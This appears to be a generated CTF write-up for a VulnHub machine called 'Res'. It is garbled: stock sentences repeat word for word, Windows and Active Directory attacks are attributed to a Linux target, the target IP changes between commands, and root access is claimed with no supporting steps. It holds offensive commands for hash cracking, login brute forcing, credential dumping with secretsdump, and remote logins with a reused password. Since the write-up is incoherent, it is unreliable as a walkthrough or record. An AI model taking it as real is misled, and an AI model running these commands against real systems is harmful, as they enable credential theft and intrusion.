---
TitleSEO: "VulnHub — Res (Hard Linux) | ZureFX"
TitlePost: "VulnHub — Res (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Res. Sudo Misconfiguration and ACL Abuse to achieve hard compromise on Linux."
Keywords: "ctf, active directory, hard, medium, reversing, forensics, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-res-638.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-res-638/"
Date: "2025-04-29"
Tags: "CTF, Active Directory, Hard, Medium, Reversing, Forensics, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-res-638"
Permalink: "/writeups/htb-res-638.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Res** is rated **Hard** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.24.44.132`.

### Objectives

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.54.66.101 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.11.40
nmap -sCV -p27017,135,23 10.11.145.52 -oN scan.txt
```

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.172.15/FUZZ
feroxbuster -h
gobuster dir -u http://10.41.159.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.29.77.196 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.58.111 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

Key finding: **Sudo Misconfiguration**.

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.181.100
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.127.216/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.179.232/FUZZ
evil-winrm -i 10.16.59.142 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.103.57.194 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `hashcat`
- `netcat`
- `evil-winrm`
- `burpsuite`
- `sqlmap`
- `john`

### Key Takeaways

- Sudo Misconfiguration
- ACL Abuse
